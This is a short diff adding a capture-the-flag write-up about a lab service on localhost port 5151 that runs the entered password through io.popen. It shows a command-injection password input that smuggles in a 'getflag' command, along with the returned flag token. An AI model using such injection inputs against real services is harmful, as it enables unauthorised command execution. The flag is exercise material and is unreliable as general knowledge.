@@ -1,0 +1,11 @@
+# The program waits for a connection on 127.0.0.1:5151
+# It will then prompt for a Password and pass anything we write in a hash function
+# The hash function will execute the prompted command in `io.popen` to generate the hash
+# We just need it to add whatever we want to execute in popen (code injection)
+
+> nc 127.0.0.1 5151
+Password: \";getflag > /tmp/token;\"
+Erf nope..
+
+> cat /tmp/token
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
